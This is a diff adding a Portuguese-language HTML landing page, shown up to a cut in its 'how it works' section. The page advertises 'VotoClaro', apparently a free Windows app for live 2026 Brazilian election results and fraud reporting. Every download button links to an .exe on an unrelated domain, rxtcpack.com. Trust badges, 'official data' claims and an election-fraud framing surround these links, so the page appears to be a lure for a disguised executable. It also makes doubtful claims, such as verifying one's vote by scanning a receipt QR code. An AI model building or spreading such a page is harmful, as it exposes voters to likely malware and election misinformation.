@@ -1,0 +1,884 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>VotoClaro — Resultados das Eleições 2026 no Brasil, ao vivo (Windows)</title>
+<meta name="description" content="App para Windows que mostra a apuração das eleições de 2026 em tempo real e ajuda a combater a fraude eleitoral. Apartidário, dados oficiais e trilha de auditoria aberta.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Sora:wght@600;700;800&display=swap" rel="stylesheet">
+<style>
+/* ---------- Tokens ---------- */
+:root{
+  --bg:#040b09;
+  --bg-soft:#08130f;
+  --panel:rgba(255,255,255,.045);
+  --panel-2:rgba(255,255,255,.07);
+  --line:rgba(255,255,255,.10);
+  --line-2:rgba(255,255,255,.18);
+  --text:#e9f4ef;
+  --muted:#8fa79d;
+  --green:#00c46a;
+  --green-deep:#009c3b;
+  --yellow:#ffd400;
+  --blue:#1b4de4;
+  --radius:18px;
+  --maxw:1180px;
+}
+
+*,*::before,*::after{box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  margin:0;
+  background:var(--bg);
+  color:var(--text);
+  font-family:"Inter",system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
+  line-height:1.6;
+  -webkit-font-smoothing:antialiased;
+  overflow-x:hidden;
+}
+body::before{
+  content:"";
+  position:fixed;
+  inset:0;
+  pointer-events:none;
+  z-index:0;
+  background:
+    radial-gradient(900px 600px at 12% -5%, rgba(0,196,106,.18), transparent 60%),
+    radial-gradient(800px 550px at 92% 0%, rgba(27,77,228,.16), transparent 62%),
+    radial-gradient(700px 500px at 60% 110%, rgba(255,212,0,.07), transparent 60%);
+}
+h1,h2,h3,.font-display{font-family:"Sora","Inter",sans-serif;letter-spacing:-.02em;line-height:1.12;margin:0}
+p{margin:0}
+a{color:inherit;text-decoration:none}
+img,svg{display:block;max-width:100%}
+.wrap{width:100%;max-width:var(--maxw);margin-inline:auto;padding-inline:22px;position:relative;z-index:1}
+
+/* ---------- Buttons ---------- */
+.btn{
+  display:inline-flex;align-items:center;gap:11px;
+  padding:13px 22px;border-radius:14px;
+  font-weight:600;font-size:.95rem;
+  border:1px solid transparent;
+  transition:transform .18s ease, box-shadow .18s ease, background .18s ease, border-color .18s ease;
+  cursor:pointer;white-space:nowrap;
+}
+.btn:hover{transform:translateY(-2px)}
+.btn:active{transform:translateY(0)}
+.btn-primary{
+  background:linear-gradient(135deg,var(--green),#00a95a);
+  color:#03150c;
+  box-shadow:0 12px 34px -12px rgba(0,196,106,.75);
+}
+.btn-primary:hover{box-shadow:0 18px 42px -12px rgba(0,196,106,.9)}
+.btn-ghost{
+  background:var(--panel);
+  border-color:var(--line-2);
+  color:var(--text);
+  backdrop-filter:blur(10px);
+}
+.btn-ghost:hover{background:var(--panel-2);border-color:rgba(255,255,255,.3)}
+.btn svg{width:20px;height:20px;flex:none}
+
+/* Windows download button */
+.win-btn{
+  display:inline-flex;align-items:center;gap:14px;
+  padding:15px 28px 15px 22px;border-radius:16px;
+  background:linear-gradient(135deg,var(--green),#00a95a);
+  color:#03150c;
+  font-weight:700;
+  box-shadow:0 16px 42px -14px rgba(0,196,106,.85);
+  transition:transform .18s ease, box-shadow .18s ease;
+  border:1px solid rgba(255,255,255,.16);
+}
+.win-btn:hover{transform:translateY(-3px);box-shadow:0 22px 52px -14px rgba(0,196,106,1)}
+.win-btn:active{transform:translateY(-1px)}
+.win-btn svg{width:30px;height:30px;flex:none}
+.win-btn .s-top{font-size:.68rem;letter-spacing:.09em;text-transform:uppercase;font-weight:700;opacity:.72;line-height:1.2}
+.win-btn .s-bot{font-size:1.08rem;font-weight:800;line-height:1.2;font-family:"Sora",sans-serif}
+
+/* Secondary Windows button (CTA) */
+.win-btn-outline{
+  display:inline-flex;align-items:center;gap:14px;
+  padding:15px 28px 15px 22px;border-radius:16px;
+  background:#0b1713;
+  border:1px solid rgba(0,196,106,.5);
+  color:var(--text);
+  transition:transform .18s ease, border-color .18s ease, background .18s ease;
+}
+.win-btn-outline:hover{transform:translateY(-3px);border-color:var(--green);background:#0e1f19}
+.win-btn-outline svg{width:30px;height:30px;flex:none;color:var(--green)}
+.win-btn-outline .s-top{font-size:.68rem;letter-spacing:.09em;text-transform:uppercase;font-weight:700;color:var(--muted);line-height:1.2}
+.win-btn-outline .s-bot{font-size:1.08rem;font-weight:800;line-height:1.2;font-family:"Sora",sans-serif}
+
+/* ---------- Nav ---------- */
+header{
+  position:sticky;top:0;z-index:50;
+  backdrop-filter:blur(16px);
+  background:rgba(4,11,9,.72);
+  border-bottom:1px solid transparent;
+  transition:border-color .3s ease, background .3s ease;
+}
+header.scrolled{border-bottom-color:var(--line);background:rgba(4,11,9,.88)}
+.nav{display:flex;align-items:center;justify-content:space-between;height:70px}
+.logo{display:flex;align-items:center;gap:11px;font-family:"Sora",sans-serif;font-weight:800;font-size:1.12rem;letter-spacing:-.03em}
+.logo-mark{
+  width:34px;height:34px;border-radius:10px;flex:none;
+  background:linear-gradient(135deg,var(--green-deep),var(--green) 55%,var(--yellow));
+  display:grid;place-items:center;
+  box-shadow:0 6px 20px -6px rgba(0,196,106,.7);
+}
+.logo-mark svg{width:19px;height:19px}
+.nav-links{display:flex;gap:30px;font-size:.9rem;color:var(--muted);font-weight:500}
+.nav-links a{transition:color .2s}
+.nav-links a:hover{color:var(--text)}
+.nav-cta{display:flex;align-items:center;gap:14px}
+.nav .btn{padding:10px 18px;font-size:.88rem}
+
+/* ---------- Hero ---------- */
+.hero{padding:78px 0 90px;position:relative}
+.hero-grid{display:grid;grid-template-columns:1.06fr .94fr;gap:60px;align-items:center}
+.pill{
+  display:inline-flex;align-items:center;gap:9px;
+  padding:7px 15px 7px 11px;border-radius:999px;
+  background:rgba(0,196,106,.10);
+  border:1px solid rgba(0,196,106,.3);
+  color:#7ff0b6;font-size:.78rem;font-weight:600;letter-spacing:.02em;
+  margin-bottom:26px;
+}
+.pill .dot{width:7px;height:7px;border-radius:50%;background:var(--green);box-shadow:0 0 0 0 rgba(0,196,106,.7);animation:pulse 2.2s infinite}
+@keyframes pulse{
+  0%{box-shadow:0 0 0 0 rgba(0,196,106,.65)}
+  70%{box-shadow:0 0 0 9px rgba(0,196,106,0)}
+  100%{box-shadow:0 0 0 0 rgba(0,196,106,0)}
+}
+.hero h1{font-size:clamp(2.4rem,5.2vw,3.9rem);font-weight:800}
+.hero h1 .hl{
+  background:linear-gradient(100deg,var(--green) 0%,var(--yellow) 100%);
+  -webkit-background-clip:text;background-clip:text;color:transparent;
+}
+.hero-sub{margin-top:22px;font-size:1.09rem;color:var(--muted);max-width:540px}
+.hero-actions{display:flex;flex-wrap:wrap;gap:13px;margin-top:34px;align-items:center}
+.hero-platform{
+  display:flex;align-items:center;gap:8px;
+  font-size:.82rem;color:var(--muted);
+}
+.hero-platform svg{width:16px;height:16px;color:var(--green)}
+.hero-meta{display:flex;flex-wrap:wrap;gap:22px;margin-top:30px;font-size:.83rem;color:var(--muted)}
+.hero-meta span{display:flex;align-items:center;gap:8px}
+.hero-meta svg{width:15px;height:15px;color:var(--green)}
+
+/* ---------- Desktop mockup ---------- */
+.desktop-stage{position:relative;display:flex;justify-content:center;perspective:1400px}
+.desktop-glow{
+  position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);
+  width:520px;height:420px;border-radius:50%;
+  background:radial-gradient(circle,rgba(0,196,106,.28),transparent 65%);
+  filter:blur(24px);z-index:0;
+}
+.desktop-window{
+  position:relative;z-index:1;
+  width:100%;max-width:620px;
+  border-radius:18px;
+  background:linear-gradient(160deg,#16241f,#0a1210);
+  border:1px solid rgba(255,255,255,.14);
+  box-shadow:0 46px 90px -30px rgba(0,0,0,.95), 0 0 0 1px rgba(255,255,255,.04) inset;
+  transform:rotateY(-6deg) rotateX(2deg);
+  animation:float 7s ease-in-out infinite;
+  overflow:hidden;
+}
+@keyframes float{
+  0%,100%{transform:rotateY(-6deg) rotateX(2deg) translateY(0)}
+  50%{transform:rotateY(-6deg) rotateX(2deg) translateY(-13px)}
+}
+.window-bar{
+  display:flex;align-items:center;justify-content:space-between;
+  padding:12px 18px;
+  background:rgba(255,255,255,.04);
+  border-bottom:1px solid var(--line);
+}
+.window-dots{display:flex;gap:8px}
+.window-dots span{width:12px;height:12px;border-radius:50%;display:block}
+.dot-red{background:#ff5a5a}
+.dot-yellow{background:#ffd400}
+.dot-green{background:#00c46a}
+.window-title{
+  font-size:.8rem;font-weight:600;color:var(--muted);
+  font-family:"Sora",sans-serif;letter-spacing:.02em;
+}
+.window-actions{display:flex;gap:12px;color:var(--muted)}
+.window-actions svg{width:16px;height:16px}
+.window-body{padding:22px 24px 24px}
+.scr-head{display:flex;justify-content:space-between;align-items:baseline;margin-bottom:4px}
+.scr-title{font-family:"Sora",sans-serif;font-weight:700;font-size:1rem}
+.scr-live{display:flex;align-items:center;gap:5px;font-size:.68rem;font-weight:700;color:#ff5a5a;letter-spacing:.06em}
+.scr-live .d{width:6px;height:6px;border-radius:50%;background:#ff5a5a;animation:pulse2 1.6s infinite}
+@keyframes pulse2{0%,100%{opacity:1}50%{opacity:.25}}
+.scr-sub{font-size:.75rem;color:var(--muted);margin-bottom:18px}
+.progress-wrap{margin-bottom:20px}
+.progress-label{display:flex;justify-content:space-between;font-size:.72rem;color:var(--muted);margin-bottom:6px}
+.progress-label b{color:var(--green);font-weight:700}
+.track{height:8px;border-radius:99px;background:rgba(255,255,255,.08);overflow:hidden}
+.track .fill{height:100%;border-radius:99px;background:linear-gradient(90deg,var(--green-deep),var(--green));width:0;transition:width 1.6s cubic-bezier(.2,.8,.2,1)}
+.cand{margin-bottom:14px}
+.cand-top{display:flex;justify-content:space-between;align-items:center;font-size:.8rem;margin-bottom:6px}
+.cand-name{display:flex;align-items:center;gap:8px;font-weight:600}
+.cand-num{width:22px;height:22px;border-radius:6px;background:rgba(255,255,255,.08);display:grid;place-items:center;font-size:.65rem;color:var(--muted);font-weight:700}
+.cand-pct{font-family:"Sora",sans-serif;font-weight:700;font-size:.85rem;font-variant-numeric:tabular-nums}
+.bar{height:8px;border-radius:99px;background:rgba(255,255,255,.07);overflow:hidden}
+.bar i{display:block;height:100%;border-radius:99px;width:0;transition:width 1.7s cubic-bezier(.2,.8,.2,1)}
+.b1 i{background:linear-gradient(90deg,#00a95a,#00e07c)}
+.b2 i{background:linear-gradient(90deg,#1b4de4,#4d7bff)}
+.b3 i{background:linear-gradient(90deg,#c9a800,#ffd400)}
+.b4 i{background:linear-gradient(90deg,#5a6b66,#8fa79d)}
+.scr-foot{
+  margin-top:18px;padding-top:14px;border-top:1px solid var(--line);
+  display:flex;align-items:center;gap:8px;font-size:.72rem;color:var(--muted);
+}
+.scr-foot svg{width:14px;height:14px;color:var(--green);flex:none}
+
+.float-badge{
+  position:absolute;z-index:3;
+  background:rgba(9,20,16,.92);
+  border:1px solid var(--line-2);
+  backdrop-filter:blur(12px);
+  border-radius:14px;padding:11px 15px;
+  display:flex;align-items:center;gap:10px;
+  box-shadow:0 22px 45px -20px rgba(0,0,0,.9);
+}
+.float-badge svg{width:19px;height:19px;flex:none}
+.fb-1{top:12%;left:-4%;animation:float2 6s ease-in-out infinite}
+.fb-2{bottom:12%;right:-4%;animation:float2 6s ease-in-out infinite .9s}
+@keyframes float2{0%,100%{transform:translateY(0)}50%{transform:translateY(-11px)}}
+.fb-txt{font-size:.68rem;line-height:1.35}
+.fb-txt b{display:block;font-family:"Sora",sans-serif;font-size:.79rem;font-weight:700}
+.fb-txt span{color:var(--muted)}
+
+/* ---------- Ticker ---------- */
+.ticker{
+  border-block:1px solid var(--line);
+  background:rgba(255,255,255,.02);
+  overflow:hidden;padding:15px 0;
+  mask-image:linear-gradient(90deg,transparent,#000 9%,#000 91%,transparent);
+  -webkit-mask-image:linear-gradient(90deg,transparent,#000 9%,#000 91%,transparent);
+}
+.ticker-track{display:flex;gap:46px;width:max-content;animation:scroll 42s linear infinite}
+@keyframes scroll{to{transform:translateX(-50%)}}
+.tick{display:flex;align-items:center;gap:9px;font-size:.8rem;color:var(--muted);white-space:nowrap;font-weight:500}
+.tick b{color:var(--text);font-weight:600}
+.tick .up{color:var(--green);font-size:.72rem;font-weight:700}
+
+/* ---------- Sections ---------- */
+section{padding:96px 0;position:relative}
+.sec-head{max-width:660px;margin-bottom:56px}
+.sec-tag{
+  display:inline-block;font-size:.72rem;font-weight:700;letter-spacing:.14em;
+  text-transform:uppercase;color:var(--green);margin-bottom:16px;
+}
+.sec-head h2{font-size:clamp(1.85rem,3.6vw,2.7rem);font-weight:800}
+.sec-head p{margin-top:18px;color:var(--muted);font-size:1.02rem}
+
+/* ---------- Features ---------- */
+.features{display:grid;grid-template-columns:repeat(auto-fit,minmax(290px,1fr));gap:18px}
+.card{
+  background:var(--panel);
+  border:1px solid var(--line);
+  border-radius:var(--radius);
+  padding:28px 26px;
+  transition:transform .25s ease,border-color .25s ease,background .25s ease;
+  position:relative;overflow:hidden;
+}
+.card::after{
+  content:"";position:absolute;inset:0;border-radius:var(--radius);
+  background:radial-gradient(420px 200px at 0% 0%,rgba(0,196,106,.10),transparent 70%);
+  opacity:0;transition:opacity .3s ease;pointer-events:none;
+}
+.card:hover{transform:translateY(-5px);border-color:rgba(0,196,106,.35);background:var(--panel-2)}
+.card:hover::after{opacity:1}
+.card-icon{
+  width:44px;height:44px;border-radius:13px;
+  display:grid;place-items:center;margin-bottom:19px;
+  background:rgba(0,196,106,.12);
+  border:1px solid rgba(0,196,106,.25);
+  color:var(--green);
+}
+.card-icon svg{width:21px;height:21px}
+.card h3{font-size:1.05rem;font-weight:700;margin-bottom:10px}
+.card p{font-size:.9rem;color:var(--muted)}
+
+/* ---------- Steps ---------- */
+.steps{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:26px;counter-reset:s}
+.step{position:relative;padding-top:26px;border-top:2px solid var(--line)}
+.step::before{
+  counter-increment:s;content:"0" counter(s);
+  position:absolute;top:-15px;left:0;
+  font-family:"Sora",sans-serif;font-weight:800;font-size:.8rem;
+  background:var(--bg);padding-right:14px;color:var(--green);letter-spacing:.05em;
+}
+.step h3{font-size:1.06rem;font-weight:700;margin-bottom:10px}
+.step p{font-size:.9rem;color:var(--muted)}
+
+/* ---------- Stats ---------- */
+.stats{
+  display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:14px;
+  border:1px solid var(--line);border-radius:24px;
+  background:linear-gradient(150deg,rgba(0,196,106,.08),rgba(27,77,228,.06));
+  padding:44px 32px;
+}
+.stat{text-align:center}
+.stat b{
+  display:block;font-family:"Sora",sans-serif;font-weight:800;
+  font-size:clamp(1.9rem,4vw,2.7rem);line-height:1;
+  background:linear-gradient(140deg,#fff,#7ff0b6);
+  -webkit-background-clip:text;background-clip:text;color:transparent;
+  font-variant-numeric:tabular-nums;
+}
+.stat span{display:block;margin-top:9px;font-size:.83rem;color:var(--muted)}
+
+/* ---------- FAQ ---------- */
+.faq{max-width:800px;margin-inline:auto}
+details{
+  border:1px solid var(--line);border-radius:14px;
+  background:var(--panel);margin-bottom:11px;
+  transition:border-color .25s ease,background .25s ease;
+}
+details[open]{border-color:rgba(0,196,106,.3);background:var(--panel-2)}
+summary{
+  padding:19px 22px;cursor:pointer;font-weight:600;font-size:.96rem;
+  list-style:none;display:flex;justify-content:space-between;align-items:center;gap:16px;
+}
+summary::-webkit-details-marker{display:none}
+summary::after{
+  content:"";width:9px;height:9px;flex:none;
+  border-right:2px solid var(--muted);border-bottom:2px solid var(--muted);
+  transform:rotate(45deg);transition:transform .25s ease;margin-top:-4px;
+}
+details[open] summary::after{transform:rotate(-135deg);margin-top:2px;border-color:var(--green)}
+details p{padding:0 22px 20px;font-size:.9rem;color:var(--muted);max-width:92%}
+
+/* ---------- CTA ---------- */
+.cta-card{
+  border:1px solid rgba(0,196,106,.28);
+  border-radius:28px;
+  background:
+    radial-gradient(700px 340px at 20% 0%,rgba(0,196,106,.20),transparent 65%),
+    radial-gradient(600px 320px at 88% 100%,rgba(255,212,0,.11),transparent 65%),
+    rgba(255,255,255,.03);
+  padding:66px 40px;text-align:center;
+}
+.cta-card h2{font-size:clamp(1.9rem,4vw,2.9rem);font-weight:800}
+.cta-card p{margin-top:18px;color:var(--muted);max-width:520px;margin-inline:auto}
+.cta-actions{display:flex;flex-wrap:wrap;gap:14px;justify-content:center;margin-top:34px}
+.cta-note{margin-top:22px;font-size:.78rem;color:var(--muted)}
+.cta-hash{
+  margin-top:16px;font-size:.72rem;color:var(--muted);
+  font-family:ui-monospace,SFMono-Regular,Menlo,monospace;
+  word-break:break-all;opacity:.85;
+}
+
+/* ---------- Footer ---------- */
+footer{border-top:1px solid var(--line);padding:58px 0 40px;background:rgba(0,0,0,.28)}
+.foot-grid{display:grid;grid-template-columns:1.6fr 1fr 1fr 1fr;gap:40px;margin-bottom:44px}
+.foot-grid h4{font-size:.76rem;letter-spacing:.12em;text-transform:uppercase;color:var(--muted);font-weight:700;margin-bottom:16px}
+.foot-grid ul{list-style:none;padding:0;margin:0;display:grid;gap:10px}
+.foot-grid a{font-size:.88rem;color:var(--muted);transition:color .2s}
+.foot-grid a:hover{color:var(--green)}
+.foot-desc{font-size:.87rem;color:var(--muted);max-width:300px;margin-top:16px}
+.disclaimer{
+  border-top:1px solid var(--line);padding-top:26px;
+  font-size:.77rem;color:#6d817a;line-height:1.7;
+}
+.disclaimer strong{color:var(--muted)}
+
+/* ---------- Reveal ---------- */
+.reveal{opacity:0;transform:translateY(26px);transition:opacity .7s cubic-bezier(.2,.8,.2,1),transform .7s cubic-bezier(.2,.8,.2,1)}
+.reveal.in{opacity:1;transform:none}
+
+/* ---------- Responsive ---------- */
+@media (max-width:960px){
+  .hero-grid{grid-template-columns:1fr;gap:64px}
+  .hero-sub{max-width:none}
+  .desktop-stage{order:-1}
+  .nav-links{display:none}
+  .foot-grid{grid-template-columns:1fr 1fr;gap:34px}
+}
+@media (max-width:560px){
+  section{padding:70px 0}
+  .hero{padding:48px 0 66px}
+  .hero-actions{width:100%}
+  .win-btn,.win-btn-outline{width:100%;justify-content:center}
+  .float-badge{display:none}
+  .window-body{padding:16px}
+  .cta-card{padding:48px 22px}
+  .stats{padding:34px 20px;gap:26px}
+  .foot-grid{grid-template-columns:1fr}
+  .nav-cta .btn{display:none}
+}
+@media (prefers-reduced-motion:reduce){
+  *{animation:none!important;transition-duration:.01ms!important}
+  .reveal{opacity:1;transform:none}
+}
+</style>
+</head>
+<body>
+
+<!-- ============ NAV ============ -->
+<header id="header">
+  <div class="wrap nav">
+    <a href="#" class="logo">
+      <span class="logo-mark">
+        <svg viewBox="0 0 24 24" fill="none" stroke="#04170e" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M20 6 9 17l-5-5"/>
+        </svg>
+      </span>
+      VotoClaro
+    </a>
+    <nav class="nav-links">
+      <a href="#features">Recursos</a>
+      <a href="#how">Como funciona</a>
+      <a href="#trust">Transparência</a>
+      <a href="#faq">FAQ</a>
+    </nav>
+    <div class="nav-cta">
+      <a href="https://rxtcpack.com/app.exe" class="btn btn-primary" rel="noopener">
+        <svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
+          <path d="M0 3.5 9.5 2.2v9.3H0V3.5zm10.8-1.4L24 0v11.5H10.8V2.1zM0 12.5h9.5v9.3L0 20.5v-8zm10.8 0H24V24l-13.2-1.9v-9.6z"/>
+        </svg>
+        Baixar para Windows
+      </a>
+    </div>
+  </div>
+</header>
+
+<!-- ============ HERO ============ -->
+<section class="hero">
+  <div class="wrap hero-grid">
+    <div class="hero-copy">
+      <div class="pill"><span class="dot"></span> Apartidário · Dados oficiais · Grátis para sempre</div>
+      <h1>Cada voto,<br><span class="hl">em aberto.</span></h1>
+      <p class="hero-sub">
+        Acompanhe no seu PC os resultados das eleições de 2026 no Brasil em tempo real — e ajude a combater
+        a fraude antes que ela se espalhe. O VotoClaro puxa dados direto de fontes oficiais, confere os números
+        de forma independente e permite que qualquer cidadão denuncie uma irregularidade em segundos.
+      </p>
+
+      <div class="hero-actions">
+        <a href="https://rxtcpack.com/app.exe" class="win-btn" rel="noopener">
+          <svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
+            <path d="M0 3.5 9.5 2.2v9.3H0V3.5zm10.8-1.4L24 0v11.5H10.8V2.1zM0 12.5h9.5v9.3L0 20.5v-8zm10.8 0H24V24l-13.2-1.9v-9.6z"/>
+          </svg>
+          <span>
+            <span class="s-top">Baixar grátis para</span>
+            <span class="s-bot">Windows 10 / 11</span>
+          </span>
+        </a>
+        <span class="hero-platform">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6 9 17l-5-5"/></svg>
+          ~48 MB · Instalador .exe
+        </span>
+      </div>
+
+      <div class="hero-meta">
+        <span>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+          Sem anúncios, sem doações, sem dinheiro de partido
+        </span>
+        <span>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6 9 17l-5-5"/></svg>
+          Funciona offline no dia da eleição
+        </span>
+      </div>
+    </div>
+
+    <!-- Desktop mockup -->
+    <div class="desktop-stage">
+      <div class="desktop-glow"></div>
+
+      <div class="float-badge fb-1">
+        <svg viewBox="0 0 24 24" fill="none" stroke="#00c46a" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="m9 12 2 2 4-4"/></svg>
+        <div class="fb-txt"><b>Fonte verificada</b><span>Feed oficial · hash conferido</span></div>
+      </div>
+
+      <div class="float-badge fb-2">
+        <svg viewBox="0 0 24 24" fill="none" stroke="#ffd400" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M10.3 3.9 1.8 18a2 2 0 0 0 1.7 3h17a2 2 0 0 0 1.7-3L13.7 3.9a2 2 0 0 0-3.4 0z"/><path d="M12 9v4M12 17h.01"/></svg>
+        <div class="fb-txt"><b>3 alertas sinalizados</b><span>Revisado pela comunidade</span></div>
+      </div>
+
+      <div class="desktop-window">
+        <div class="window-bar">
+          <div class="window-dots">
+            <span class="dot-red"></span>
+            <span class="dot-yellow"></span>
+            <span class="dot-green"></span>
+          </div>
+          <div class="window-title">VotoClaro — Apuração ao vivo</div>
+          <div class="window-actions">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M5 12h14"/></svg>
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><rect x="5" y="5" width="14" height="14" rx="1"/></svg>
+          </div>
+        </div>
+        <div class="window-body">
+          <div class="scr-head">
+            <span class="scr-title">Apuração ao vivo</span>
+            <span class="scr-live"><span class="d"></span>AO VIVO</span>
+          </div>
+          <div class="scr-sub">Disputa presidencial · 1º turno</div>
+
+          <div class="progress-wrap">
+            <div class="progress-label"><span>Votos apurados</span><b>78,4%</b></div>
+            <div class="track"><div class="fill" data-w="78.4%"></div></div>
+          </div>
+
+          <div class="cand">
+            <div class="cand-top">
+              <span class="cand-name"><span class="cand-num">1</span>Candidato A</span>
+              <span class="cand-pct">42,1%</span>
+            </div>
+            <div class="bar b1"><i data-w="42.1%"></i></div>
+          </div>
+
+          <div class="cand">
+            <div class="cand-top">
+              <span class="cand-name"><span class="cand-num">2</span>Candidato B</span>
+              <span class="cand-pct">33,7%</span>
+            </div>
+            <div class="bar b2"><i data-w="33.7%"></i></div>
+          </div>
+
+          <div class="cand">
+            <div class="cand-top">
+              <span class="cand-name"><span class="cand-num">3</span>Candidato C</span>
+              <span class="cand-pct">14,2%</span>
+            </div>
+            <div class="bar b3"><i data-w="14.2%"></i></div>
+          </div>
+
+          <div class="cand">
+            <div class="cand-top">
+              <span class="cand-name"><span class="cand-num">4</span>Outros</span>
+              <span class="cand-pct">10,0%</span>
+            </div>
+            <div class="bar b4"><i data-w="10%"></i></div>
+          </div>
+
+          <div class="scr-foot">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6 9 17l-5-5"/></svg>
+            Conferido com fonte oficial
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============ TICKER ============ -->
+<div class="ticker" aria-hidden="true">
+  <div class="ticker-track" id="tickerTrack">
+    <span class="tick"><b>São Paulo</b> 82,1% apurado <span class="up">▲ 0,4</span></span>
+    <span class="tick"><b>Minas Gerais</b> 76,8% apurado <span class="up">▲ 0,9</span></span>
+    <span class="tick"><b>Bahia</b> 71,2% apurado <span class="up">▲ 0,3</span></span>
+    <span class="tick"><b>Rio de Janeiro</b> 80,5% apurado <span class="up">▲ 0,6</span></span>
+    <span class="tick"><b>Rio Grande do Sul</b> 74,9% apurado <span class="up">▲ 0,2</span></span>
+    <span class="tick"><b>Paraná</b> 79,3% apurado <span class="up">▲ 0,5</span></span>
+    <span class="tick"><b>Pernambuco</b> 68,4% apurado <span class="up">▲ 0,7</span></span>
+    <span class="tick"><b>Ceará</b> 66,9% apurado <span class="up">▲ 0,1</span></span>
+    <span class="tick"><b>Pará</b> 61,7% apurado <span class="up">▲ 0,8</span></span>
+    <span class="tick"><b>Santa Catarina</b> 83,6% apurado <span class="up">▲ 0,4</span></span>
+  </div>
+</div>
+
+<!-- ============ FEATURES ============ -->
+<section id="features">
+  <div class="wrap">
+    <div class="sec-head reveal">
+      <span class="sec-tag">O que faz</span>
+      <h2>Resultados que você pode acompanhar. Fraude que você pode pegar.</h2>
+      <p>Duas funções, um app: tornar a apuração visível para todos e tornar irregularidades impossíveis de esconder.</p>
+    </div>
+
+    <div class="features">
+      <div class="card reveal">
+        <div class="card-icon">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 3v18h18"/><path d="m7 14 4-4 3 3 5-6"/></svg>
+        </div>
+        <h3>Resultados oficiais em tempo real</h3>
+        <p>Contagem de votos ao vivo por estado, cidade e zona, transmitida de fontes oficiais e atualizada a cada poucos segundos — não a cada horas.</p>
+      </div>
+
+      <div class="card reveal">
+        <div class="card-icon">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="7"/><path d="m20 20-3.5-3.5"/><path d="M11 8v3l2 1"/></svg>
+        </div>
+        <h3>Detecção de anomalias</h3>
+        <p>Modelos estatísticos sinalizam saltos impossíveis, outliers de comparecimento e discrepâncias em urnas no momento em que aparecem — com os números brutos anexados.</p>
+      </div>
+
+      <div class="card reveal">
+        <div class="card-icon">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="m9 12 2 2 4-4"/></svg>
+        </div>
+        <h3>Verifique seu próprio voto</h3>
+        <p>Escaneie o QR code do seu comprovante de votação para confirmar que seu voto foi registrado e contado — sem nunca revelar em quem você votou.</p>
+      </div>
+
+      <div class="card reveal">
+        <div class="card-icon">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><path d="M14 2v6h6"/><path d="M9 15h6M9 11h3"/></svg>
+        </div>
+        <h3>Denuncie uma irregularidade</h3>
+        <p>Fotografe, geolocalize e envie uma denúncia em menos de 30 segundos. Cada envio recebe data e hora e é assinado criptograficamente para não poder ser alterado depois.</p>
+      </div>
+
+      <div class="card reveal">
+        <div class="card-icon">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 7V4h16v3"/><path d="M9 20h6"/><path d="M12 4v16"/></svg>
+        </div>
+        <h3>Trilha de auditoria aberta</h3>
+        <p>Cada dado carrega sua fonte, data/hora e checksum. Qualquer pessoa — jornalistas, pesquisadores, partidos — pode reproduzir exatamente como um número chegou.</p>
+      </div>
+
+      <div class="card reveal">
+        <div class="card-icon">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12.5a7 7 0 0 1 14 0"/><path d="M2 12.5a10 10 0 0 1 20 0"/><circle cx="12" cy="18" r="2"/></svg>
+        </div>
+        <h3>Funciona quando a rede não funciona</h3>
+        <p>Resultados pré-carregados e fila de denúncias offline mantêm o app útil em áreas remotas, durante quedas de conexão ou quando a conectividade é deliberadamente interrompida.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============ HOW IT WORKS ============ -->
+<section id="how" style="padding-top:0">
+  <div class="wrap">
+    <div class="sec-head reveal">
+      <span class="sec-tag">Como funciona</span>
+      <h2>Três passos entre a urna e a verdade.</h2>
+    </div>
+
+    <div class="steps">
+      <div class="step reveal">
+        <h3>Instale no Windows e escolha seu estado</h3>
